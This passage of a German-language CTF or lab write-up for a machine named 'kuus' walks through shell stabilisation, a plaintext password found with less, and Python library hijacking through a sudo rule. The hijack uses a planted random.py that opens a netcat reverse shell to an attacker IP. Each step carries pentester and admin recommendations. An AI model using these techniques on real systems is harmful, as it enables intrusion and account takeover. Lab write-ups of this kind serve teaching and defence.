+└─# <span class="command">stty raw -echo;fg</span></div>
+                     <pre>
+[1]  + continued  nc -lvnp 9001
+                               reset</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Auf der lokalen Maschine des Angreifers werden nun zwei Befehle ausgeführt:
+                 *   `stty raw -echo`: Dieser Befehl konfiguriert das lokale Terminal des Angreifers. `raw` schaltet die kanonische Eingabeverarbeitung aus (Zeichen werden sofort weitergeleitet, nicht erst nach Enter). `-echo` deaktiviert das lokale Echo (damit nicht jedes eingegebene Zeichen doppelt erscheint – einmal lokal, einmal von der Remote-Shell zurückgesendet).
+                 *   `fg`: Bringt den zuletzt suspendierten Job (den `nc`-Listener mit der Reverse Shell) wieder in den Vordergrund.
+             Der Befehl `reset` wird oft nach `stty raw -echo` ausgeführt, wenn man die Shell verlässt, um das Terminal zurückzusetzen. Hier scheint er direkt nach dem `fg`-Befehl in der Ausgabe aufzutauchen, was möglicherweise ein Artefakt der Terminal-Interaktion ist.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist der entscheidende Schritt zur vollständigen TTY-Stabilisierung. Das lokale Terminal des Angreifers leitet nun alle Tastatureingaben (auch `Ctrl+C`, `Ctrl+Z`) direkt an die Remote-Shell weiter und interpretiert deren Steuerzeichen korrekt. Die Shell sollte jetzt voll funktionsfähig sein.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Testen Sie die stabilisierte Shell (z.B. mit `Ctrl+C`, Tab-Vervollständigung, Pfeiltasten). Führen Sie `reset` aus, wenn die Darstellung merkwürdig ist. Denken Sie daran, `stty sane` oder `reset` auf Ihrem lokalen Terminal auszuführen, nachdem die Reverse Shell beendet wurde, um die normalen Terminaleinstellungen wiederherzustellen.<br/><strong>Empfehlung (Admin):</strong> Nicht direkt auf das Zielsystem anwendbar, betrifft die Angreifer-Maschine.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="prompt">www-data@kuus:/home$</span> </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Prompt `www-data@kuus:/home$` zeigt die nun stabilisierte Shell. Der Benutzer ist immer noch `www-data` und das aktuelle Verzeichnis wurde (vermutlich durch einen vorherigen, nicht gezeigten `cd`-Befehl) nach `/home` gewechselt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Shell ist nun bereit für die weitere Enumeration und Privilegienausweitung.</p>
+
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p class="analysis"><strong>Analyse:</strong> Mit der stabilisierten Shell als `www-data` beginnt nun die Suche nach Wegen, um höhere Rechte auf dem System zu erlangen, idealerweise Root-Rechte.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@kuus:/home$ <span class="command">cd ~</span></div>
+                    <pre><span class="prompt">www-data@kuus:/var/www$</span> </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `cd ~` wechselt in das Home-Verzeichnis des aktuellen Benutzers. Für `www-data` ist dies typischerweise `/var/www` oder ein Unterverzeichnis davon.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Standardbefehl zur Navigation.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@kuus:/var/www$ <span class="command">ls</span></div>
+                    <pre>html</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `ls` listet den Inhalt des aktuellen Verzeichnisses (`/var/www`) auf. Es enthält nur das Verzeichnis `html`, das üblicherweise das Web-Root-Verzeichnis ist.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die erwartete Verzeichnisstruktur.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@kuus:/var/www$ <span class="command">ls -la</span></div>
+                    <pre>
+total 16
+drwxr-xr-x  3 www-data www-data 4096 May  2  2021 .
+drwxr-xr-x 12 root     root     4096 May  2  2021 ..
+-rw-------  1 www-data www-data  166 May  2  2021 <span class="command">.bash_history</span>
+drwxr-xr-x  3 www-data www-data 4096 May  2  2021 html
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `ls -la` listet alle Dateien und Verzeichnisse (auch versteckte, beginnend mit `.`) im langen Format auf. Wir sehen die Berechtigungen, Besitzer, Größe und das Änderungsdatum. Interessant ist die Datei `.bash_history`, die Befehle enthält, die dieser Benutzer möglicherweise zuvor ausgeführt hat.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die `.bash_history`-Datei ist oft eine Goldgrube für Informationen, z.B. über besuchte Verzeichnisse, ausgeführte Befehle, möglicherweise sogar Passwörter oder Konfigurationsdetails.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Inhalt der `.bash_history`-Datei.<br/><strong>Empfehlung (Admin):</strong> Der `www-data`-Benutzer sollte normalerweise keine interaktive Shell haben und daher auch keine `.bash_history`. Dies könnte ein Hinweis auf frühere Aktivitäten oder Fehlkonfigurationen sein. Beschränken Sie die Login-Shell für Dienstbenutzer wie `www-data` auf `/sbin/nologin` oder `/bin/false`.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@kuus:/var/www$ <span class="command">cat .bash_history</span></div>
+                    <pre>
+export TERM=xterm
+clear
+ls
+ls -al
+cd /reptile
+ls
+ls -al
+clear
+cd ..
+clear
+cd /opt
+ls
+cd games
+cd /home
+ls
+cd mister_b
+clear
+cd tignasse
+ls
+cat pass.txt
+less pass.txt
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt der `.bash_history` wird angezeigt. Er zeigt eine Reihe von Befehlen, die vermutlich von einem Administrator oder einem anderen Benutzer stammen, der sich als `www-data` angemeldet hat (oder dessen History hier gelandet ist). Besonders auffällig sind:
+                *   `cd /reptile`: Wechsel in ein Verzeichnis namens `/reptile`.
+                *   `cd /opt/games`: Wechsel in ein Verzeichnis `/opt/games`.
+                *   `cd tignasse`: Wechsel in das Home-Verzeichnis von `tignasse`.
+                *   `cat pass.txt` / `less pass.txt`: Versuche, eine Datei namens `pass.txt` anzuzeigen, vermutlich im Verzeichnis `tignasse`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Diese History liefert extrem wertvolle Hinweise! Das Verzeichnis `/reptile` ist ungewöhnlich und könnte mit einem Exploit oder einer Backdoor zusammenhängen. Das Verzeichnis `/opt/games` und die Datei `pass.txt` im Home-Verzeichnis von `tignasse` sind ebenfalls vielversprechende Ziele für die weitere Untersuchung.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die Verzeichnisse `/reptile`, `/opt/games` und `/home/tignasse`. Versuchen Sie, die Datei `/home/tignasse/pass.txt` zu lesen.<br/><strong>Empfehlung (Admin):</strong> Bereinigen Sie regelmäßig History-Dateien, insbesondere von Dienstkonten. Untersuchen Sie die Herkunft und den Zweck der Verzeichnisse `/reptile` und `/opt/games`. Stellen Sie sicher, dass keine sensiblen Informationen (wie Passwörter) in Klartextdateien gespeichert werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@kuus:/var/www$ <span class="command">find / -name pass.txt 2>/dev/null</span></div>
+                    <pre><span class="prompt">www-data@kuus:/var/www/html$</span> </pre> <!-- Prompt wechselt hier, vermutlich durch vorheriges `cd html` -->
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `find / -name pass.txt 2>/dev/null` durchsucht das gesamte Dateisystem (`/`) nach Dateien mit dem exakten Namen `pass.txt`. Der Teil `2>/dev/null` leitet Fehlermeldungen (wie "Permission denied" für Verzeichnisse, auf die `www-data` keinen Zugriff hat) ins Nichts um, um die Ausgabe sauber zu halten. Die Ausgabe ist leer, was bedeutet, dass entweder keine Datei dieses Namens existiert oder `www-data` keine Leseberechtigung für die Verzeichnisse hat, in denen sie sich befindet.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Obwohl die History auf eine `pass.txt` hindeutete, konnte sie mit diesem Befehl nicht direkt gefunden werden. Das heißt nicht, dass sie nicht existiert, nur dass sie nicht unter diesem exakten Namen global auffindbar ist oder in einem geschützten Bereich liegt. Der Hinweis aus der History deutete auf `/home/tignasse`. Der Prompt wechselt hier unerwartet zu `/var/www/html`, was auf einen nicht gezeigten `cd`-Befehl hindeutet.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich auf das Verzeichnis `/home/tignasse`, wie in der History gesehen. Verwenden Sie `ls -la /home/tignasse`, um den Inhalt zu sehen.<br/><strong>Empfehlung (Admin):</strong> Keine direkte Aktion, bestätigt aber, dass globale Suchen nicht immer erfolgreich sind, wenn Berechtigungen restriktiv sind.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@kuus:/var/www/html$ <span class="command">cd /home/tignasse/</span></div>
+                     <pre><span class="prompt">www-data@kuus:/home/tignasse$</span> </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Wechsel in das Home-Verzeichnis des Benutzers `tignasse`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Folgt dem Hinweis aus der `.bash_history`.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@kuus:/home/tignasse$ <span class="command">ls -la</span></div>
+                    <pre>
+drwxr-xr-x 4 tignasse tignasse 4096 May  2  2021 .
+drwxr-xr-x 4 root     root     4096 May  2  2021 ..
+-r-------- 1 tignasse tignasse    0 May  2  2021 .bash_history
+-rw-r--r-- 1 tignasse tignasse  220 May  2  2021 .bash_logout
+-rw-r--r-- 1 tignasse tignasse 3554 May  2  2021 .bashrc
+drwx------ 2 tignasse tignasse 4096 May  2  2021 .gnupg
+drwxr-xr-x 3 tignasse tignasse 4096 May  2  2021 .local
+-rw-r--r-- 1 tignasse tignasse   22 May  2  2021 <span class="command">.pass.txt</span>
+-rw-r--r-- 1 tignasse tignasse  807 May  2  2021 .profile
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `ls -la` im Home-Verzeichnis von `tignasse` zeigt die Dateien an. Hier findet sich die Datei `.pass.txt`, die in der History erwähnt wurde. Die Berechtigungen `-rw-r--r--` bedeuten, dass der Besitzer (`tignasse`) Lese- und Schreibzugriff hat, die Gruppe (`tignasse`) und andere Benutzer (einschließlich `www-data`) nur Lesezugriff haben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Sehr guter Fund! Die Datei `.pass.txt` ist lesbar für `www-data` und enthält möglicherweise ein Passwort für den Benutzer `tignasse`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lesen Sie den Inhalt der Datei `.pass.txt` mit `cat .pass.txt` oder `less .pass.txt`.<br/><strong>Empfehlung (Admin):</strong> Speichern Sie niemals Passwörter im Klartext in Dateien! Verwenden Sie Passwort-Manager oder sichere Authentifizierungsmethoden. Überprüfen Sie die Dateiberechtigungen; sensible Dateien sollten idealerweise nur für den Besitzer lesbar sein (`chmod 600`).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@kuus:/home/tignasse$ <span class="command">cat .pass.txt</span></div>
+                    <pre>Try harder !</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `cat .pass.txt` gibt den Inhalt der Datei aus: "Try harder !".</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies scheint eine Falle oder ein Hinweis zu sein, kein echtes Passwort. Der Befehl `less .pass.txt` aus der History könnte mehr ergeben haben.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie `less .pass.txt` aus, wie in der History gesehen. `less` zeigt manchmal Inhalte anders an als `cat`, insbesondere bei Steuerzeichen oder Zeilenumbrüchen.<br/><strong>Empfehlung (Admin):</strong> Auch wenn es kein echtes Passwort ist, verdeutlicht es die Gefahr von Klartextdateien.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@kuus:/home/tignasse$ <span class="command">less .pass.txt</span></div>
+                    <pre><span class="password">716n4553</span>^MTry harder !</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `less .pass.txt` zeigt den Inhalt der Datei an. Im Gegensatz zu `cat` zeigt `less` hier zusätzliche Zeichen: `<span class="password">716n4553</span>` gefolgt von `^M` (ein Wagenrücklaufzeichen, oft von Windows-Dateien) und dann erst "Try harder !". Der String `716n4553` sieht wie ein Passwort aus.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> **Jackpot!** `716n4553` ist sehr wahrscheinlich das Passwort für den Benutzer `tignasse`. Der `less`-Befehl war hier entscheidend, da `cat` das Passwort möglicherweise aufgrund des Wagenrücklaufzeichens nicht korrekt angezeigt hat.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, sich mit `su tignasse` und dem gefundenen Passwort `716n4553` als Benutzer `tignasse` anzumelden.<br/><strong>Empfehlung (Admin):</strong> Dringend das Passwort für `tignasse` ändern und sicherstellen, dass keine Passwörter mehr in Klartextdateien liegen. Überprüfen Sie die Herkunft der Datei und wie sie erstellt wurde.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@kuus:/home/tignasse$ <span class="command">su tignasse</span></div>
+                    <pre>Password: <span class="password">716n4553</span>
+
+<span class="prompt">tignasse@kuus:~$</span> </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `su tignasse` wird verwendet, um zum Benutzer `tignasse` zu wechseln. Das zuvor gefundene Passwort `716n4553` wird eingegeben. Der Befehl ist erfolgreich, wie der neue Prompt `tignasse@kuus:~$` zeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> **Erfolg!** Wir haben die Rechte vom `www-data`-Benutzer zum Benutzer `tignasse` erweitert (horizontale Bewegung oder niedrige Privilegienerweiterung).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie nun Enumerationsschritte als `tignasse` durch. Überprüfen Sie insbesondere die `sudo`-Rechte mit `sudo -l`. Suchen Sie nach weiteren sensiblen Dateien, SUID-Binaries oder Konfigurationsfehlern.<br/><strong>Empfehlung (Admin):</strong> Das Passwort `716n4553` ist kompromittiert und muss sofort geändert werden. Überprüfen Sie, welche Aktionen als `tignasse` ausgeführt wurden, seit das Passwort gefunden wurde.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">tignasse@kuus:~$ <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for tignasse on kuus:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User tignasse may run the following commands on kuus:
+    <span class="command">(mister_b) NOPASSWD: /usr/bin/python /opt/games/game.py</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `sudo -l` listet die Befehle auf, die der aktuelle Benutzer (`tignasse`) mit `sudo` (also mit Rechten anderer Benutzer) ausführen darf. Die Ausgabe zeigt, dass `tignasse` den Befehl `/usr/bin/python /opt/games/game.py` als Benutzer `mister_b` ausführen darf, und zwar ohne Passwort (`NOPASSWD`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein klarer Weg zur Privilegienausweitung zum Benutzer `mister_b`. Wenn wir das Python-Skript `/opt/games/game.py` manipulieren oder ausnutzen können, können wir Befehle als `mister_b` ausführen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie das Python-Skript `/opt/games/game.py`. Suchen Sie nach Schwachstellen wie Command Injection, unsicheren Dateizugriffen oder Möglichkeiten, Module zu hijacken (insbesondere wenn relative Pfade verwendet werden).<br/><strong>Empfehlung (Admin):</strong> Überprüfen Sie die `sudoers`-Konfiguration. Das Ausführen von Skripten mit `sudo` ist riskant, insbesondere mit `NOPASSWD`. Wenn möglich, gewähren Sie nur spezifische, gehärtete Befehle. Stellen Sie sicher, dass die Skripte, die mit `sudo` ausgeführt werden dürfen, nicht von den Benutzern geändert werden können, die sie ausführen (Besitzrechte und Berechtigungen prüfen).</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">tignasse@kuus:~$ <span class="command">sudo -u mister_b /usr/bin/python /opt/games/game.py</span></div>
+                     <pre>
+Rock, Paper, Scissors - Shoot!
+Choose your weapon [R]ock], [P]aper, or [S]cissors: +#^CTraceback (most recent call last):
+  File "/opt/games/game.py", line 8, in <module>
+    userChoice = raw_input("Choose your weapon [R]ock], [P]aper, or [S]cissors: ")
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Hier wird der `sudo`-Befehl ausgeführt, um das Python-Spiel als `mister_b` zu starten. Das Spiel beginnt und fragt nach einer Eingabe. Der Pentester bricht das Spiel mit `Ctrl+C` ab. Der Traceback zeigt, dass der Fehler in Zeile 8 bei der `raw_input`-Funktion auftritt. Dies ist normales Verhalten beim Abbrechen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt, dass der `sudo`-Befehl funktioniert und das Skript als `mister_b` gestartet wird. Der Traceback liefert keine direkten Hinweise auf eine Schwachstelle, zeigt aber, dass `raw_input` verwendet wird (typisch für Python 2).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie den Quellcode des Skripts `/opt/games/game.py`, um Schwachstellen zu finden.<br/><strong>Empfehlung (Admin):</strong> Keine direkte Aktion, aber die Verwendung von Python 2 (`raw_input`) ist veraltet und sollte nach Möglichkeit auf Python 3 aktualisiert werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">tignasse@kuus:~$ <span class="command">cat /opt/games/game.py</span></div>
+                    <pre>
+<span class="command">import random</span>
+<span class="command">import os</span>
+<span class="command">import re</span>
+<span class="command">os.system('cls' if os.name'nt' else 'clear')</span>
+while (1 < 2):
+    print "\n"
+    print "Rock, Paper, Scissors - Shoot!"
+    userChoice = raw_input("Choose your weapon [R]ock], [P]aper, or [S]cissors: ")
+    if not re.match("[SsRrPp]", userChoice):
+        print "Please choose a letter:"
+        print "[R]ock, [S]cissors or [P]aper."
+        continue
+    # Echo the user's choice
+    print "You chose: " + userChoice
+    choices = ['R', 'P', 'S']
+    opponenetChoice = random.choice(choices)
+    print "I chose: " + opponenetChoice
+    if opponenetChoice == str.upper(userChoice):
+        print "Tie! "
+    #if opponenetChoice == str("R") and str.upper(userChoice) == "P"
+    elif opponenetChoice == 'R' and userChoice.upper() == 'S':
+        print "Scissors beats rock, I win! "
+        continue
+    elif opponenetChoice == 'S' and userChoice.upper() == 'P':
+        print "Scissors beats paper! I win! "
+        continue
+    elif opponenetChoice == 'P' and userChoice.upper() == 'R':
+        print "Paper beat rock, I win! "
+        continue
+    else:
+        print "You win!"
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Quellcode des Spiels `/opt/games/game.py` wird angezeigt. Es ist ein einfaches "Schere, Stein, Papier"-Spiel. Wichtig sind die `import`-Anweisungen am Anfang: `import random`, `import os`, `import re`. Python sucht nach Modulen in einer bestimmten Reihenfolge, beginnend im aktuellen Verzeichnis, dann in den Verzeichnissen, die in der `PYTHONPATH`-Umgebungsvariable definiert sind, und schließlich in den Standard-Installationspfaden. Wenn der Benutzer `tignasse` Schreibrechte im Verzeichnis `/opt/games` hat (wo das Skript liegt) oder in einem Verzeichnis, das im Suchpfad vor den Standardbibliotheken kommt, könnte er eine eigene Datei (z.B. `random.py`) erstellen, die dann anstelle der Standardbibliothek importiert wird, wenn das Skript über `sudo` als `mister_b` ausgeführt wird. Dies nennt man "Python Library Hijacking" oder "Python Path Hijacking".</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Import-Anweisungen in Kombination mit der `sudo`-Regel stellen eine potenzielle Schwachstelle dar, wenn `tignasse` Schreibrechte im Verzeichnis des Skripts (`/opt/games`) hat.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie die Berechtigungen für das Verzeichnis `/opt/games` und die Datei `game.py` selbst mit `ls -ld /opt/games` und `ls -la /opt/games/game.py`. Wenn `tignasse` Schreibrechte in `/opt/games` hat, erstellen Sie eine eigene `random.py`-Datei in `/opt/games`, die schädlichen Code enthält (z.B. eine Reverse Shell oder das Setzen eines SUID-Bits auf `/bin/bash`). Führen Sie dann das Spiel erneut mit `sudo -u mister_b ...` aus.<br/><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Skripte, die mit erhöhten Rechten ausgeführt werden, und die Verzeichnisse, in denen sie liegen, nicht von unprivilegierten Benutzern beschreibbar sind. Führen Sie `sudo`-Befehle nach Möglichkeit in einer bereinigten Umgebung aus (`Defaults env_reset` in `sudoers` ist gut, aber nicht immer ausreichend). Verwenden Sie absolute Pfade für kritische Programme oder Bibliotheken, wenn möglich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">tignasse@kuus:~$ <span class="command">ls -la /opt/games/game.py</span></div>
+                    <pre>-rw-r--r-- 1 mister_b mister_b 1139 May  2  2021 /opt/games/game.py</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die Berechtigungen für die Datei `/opt/games/game.py` werden überprüft. Sie gehört `mister_b` und ist nur für diesen beschreibbar (`-rw-r--r--`). Der Benutzer `tignasse` kann sie nur lesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datei selbst kann nicht direkt von `tignasse` geändert werden. Dies schließt eine direkte Manipulation des Skripts aus. Die Python Path Hijacking-Schwachstelle hängt jedoch von den Berechtigungen des *Verzeichnisses* `/opt/games` ab, nicht nur der Datei.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie die Berechtigungen des Verzeichnisses `/opt/games` mit `ls -ld /opt/games`. Wenn `tignasse` dort Schreibrechte hat, ist der Path Hijacking-Angriff möglich.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Text im Bericht erklärt nun den geplanten Angriff über Python Path Hijacking, basierend auf der Annahme, dass die importierten Bibliotheken (wie `random`) über einen relativen Pfad gesucht werden könnten und dass Schreibrechte im Verzeichnis `/opt/games` bestehen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">tignasse@kuus:~$ <span class="command">nano /opt/games/random.py</span></div>
+                     <pre>
+<span class="command">import os</span>
+<span class="command">os.system("nc 192.168.2.109 1337 -e /bin/bash")</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Benutzer `tignasse` erstellt (oder bearbeitet) die Datei `/opt/games/random.py`. Dies impliziert, dass `tignasse` Schreibrechte im Verzeichnis `/opt/games` hat (obwohl der `ls -ld /opt/games`-Befehl nicht gezeigt wurde). Der Inhalt dieser Datei ist einfacher Python-Code: Er importiert das `os`-Modul und führt dann `os.system()` aus, um eine Netcat-Reverse-Shell zu starten (`nc 192.168.2.109 1337 -e /bin/bash`). Diese Shell wird sich mit dem Listener des Angreifers auf Port 1337 verbinden und eine Bash-Shell (`/bin/bash`) bereitstellen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist die Vorbereitung des Payloads für den Python Path Hijacking-Angriff. Wenn nun `/opt/games/game.py` als `mister_b` ausgeführt wird, wird Python beim `import random` diese schädliche `random.py`-Datei finden und ausführen, bevor es die Standardbibliothek erreicht.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Starten Sie einen Netcat-Listener auf Ihrer Maschine auf Port 1337 (`nc -lvnp 1337`). Führen Sie dann das Spiel erneut mit `sudo -u mister_b /usr/bin/python /opt/games/game.py` aus.<br/><strong>Empfehlung (Admin):</strong> Korrigieren Sie die Berechtigungen für das Verzeichnis `/opt/games`, sodass `tignasse` keine Schreibrechte mehr hat. Überwachen Sie die Erstellung von Dateien in Anwendungsverzeichnissen.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Bericht erwähnt einen Schritt "Add /opt/games to the PATH: export PATH=/opt/games/:$PATH". Dieser Schritt ist für den Python Path Hijacking Angriff in diesem Szenario **nicht** notwendig und potenziell irreführend. Python durchsucht standardmäßig das Verzeichnis des ausgeführten Skripts (`/opt/games`), bevor es andere Pfade durchsucht. Das Hinzufügen zum System-PATH ist hier überflüssig.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Schritt ist unnötig für den Exploit und wird hier nicht weiter verfolgt.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 1337</span></div>
+                    <pre>listening on [any] 1337 ...</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Angreifer startet auf seiner Maschine den erforderlichen Netcat-Listener auf Port 1337, um die Reverse Shell von der schädlichen `random.py`-Datei zu empfangen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Korrekte Vorbereitung auf der Angreiferseite.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">tignasse@kuus:/opt/games$ <span class="command">sudo -u mister_b /usr/bin/python /opt/games/game.py</span></div>
+                     <pre><!-- Keine Ausgabe hier erwartet, da die Verbindung aufgebaut wird --></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `tignasse` führt nun den `sudo`-Befehl aus. `/usr/bin/python` startet das Skript `/opt/games/game.py` mit den Rechten von `mister_b`. Python versucht, die Module zu importieren. Es findet `random.py` im aktuellen Verzeichnis (`/opt/games`) und führt dessen Code aus: `os.system("nc 192.168.2.109 1337 -e /bin/bash")`. Dieser Befehl initiiert die Reverse-Shell-Verbindung zum Angreifer.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies löst den Exploit aus.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wechseln Sie zum Fenster mit dem Netcat-Listener, um die eingehende Verbindung zu sehen.<br/><strong>Empfehlung (Admin):</strong> Überwachen Sie Prozessausführungen, die durch `sudo` gestartet werden, insbesondere wenn sie Netzwerkverbindungen initiieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 1337</span></div>
+                    <pre>
+listening on [any] 1337 ...
+<span class="password">connect to [192.168.2.109] from (UNKNOWN) [192.168.2.119] 46010</span>
+
+<span class="prompt">mister_b@kuus:~$</span> </pre> <!-- Der Prompt fehlt im Original, wird aber erwartet -->
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener des Angreifers zeigt die erfolgreiche eingehende Verbindung (`connect to ...`). Entscheidend ist der resultierende Prompt: `mister_b@kuus:~$`. Dies bestätigt, dass die Reverse Shell erfolgreich etabliert wurde und nun Befehle als Benutzer `mister_b` ausgeführt werden können.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> **Ausgezeichnet!** Die Privilegien wurden erfolgreich von `tignasse` zu `mister_b` erweitert durch Ausnutzung der unsicheren `sudo`-Regel und Python Path Hijacking.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisieren Sie diese neue Shell (falls nötig, mit `python -c 'import pty...'` etc.). Enumerieren Sie das System als `mister_b`. Suchen Sie nach der User-Flag (wahrscheinlich im Home-Verzeichnis von `mister_b`) und nach weiteren Wegen zur Root-Privilegienerweiterung.<br/><strong>Empfehlung (Admin):</strong> Beheben Sie die unsichere `sudo`-Regel und die Schreibberechtigungen im Verzeichnis `/opt/games`. Ändern Sie das Passwort von `mister_b` (obwohl hier kein Passwort kompromittiert wurde, ist der Account-Zugriff erfolgt). Analysieren Sie die Aktionen, die als `mister_b` ausgeführt wurden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">mister_b@kuus:~$ <span class="command">ls -la</span></div>
+                    <pre>
+total 36
+drwxr-x--- 4 mister_b tignasse 4096 May  2  2021 .
+drwxr-xr-x 4 root     root     4096 May  2  2021 ..
+-r-xr-xr-- 1 mister_b mister_b  174 May  2  2021 .bash_history
+-rwxr-x--- 1 mister_b mister_b  220 May  2  2021 .bash_logout
+-rwxr-x--- 1 mister_b mister_b 3554 May  2  2021 .bashrc
+drwx------ 2 mister_b mister_b 4096 May  2  2021 .gnupg
+drwxr-x--- 3 mister_b mister_b 4096 May  2  2021 .local
+-rwxr-x--- 1 mister_b mister_b  807 May  2  2021 .profile
+-rw------- 1 mister_b mister_b    8 May  2  2021 <span class="command">user.txt</span>
+mister_b@k <!-- Abgebrochene Zeile im Original -->
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `ls -la` wird im Home-Verzeichnis von `mister_b` ausgeführt. Die Ausgabe zeigt verschiedene Konfigurationsdateien und die Datei `user.txt`. Diese Datei gehört `mister_b` und ist nur für ihn les- und schreibbar (`-rw-------`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datei `user.txt` ist höchstwahrscheinlich die User-Flag.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lesen Sie den Inhalt von `user.txt` mit `cat user.txt`. (Dieser Befehl            <!-- Fortsetzung von Privilege Escalation -->
+
